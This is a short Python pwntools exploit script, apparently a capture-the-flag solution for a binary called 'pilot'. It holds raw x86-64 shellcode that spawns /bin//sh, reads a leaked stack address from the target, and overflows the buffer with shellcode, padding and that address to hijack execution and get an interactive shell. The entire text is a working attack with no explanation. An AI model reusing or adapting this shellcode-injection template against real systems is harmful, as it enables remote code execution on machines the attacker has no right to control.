from pwn import *

s = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"


local = 0

if local:
	r = process("./pilot")
else:
	r = remote("localhost",8024)


pause()
print(r.recvuntil(":"))
dest = p64(int(r.recvline(),16))
print(r.recvuntil(":"))
r.sendline(s+b"A"*(40-23)+dest)
r.interactive()
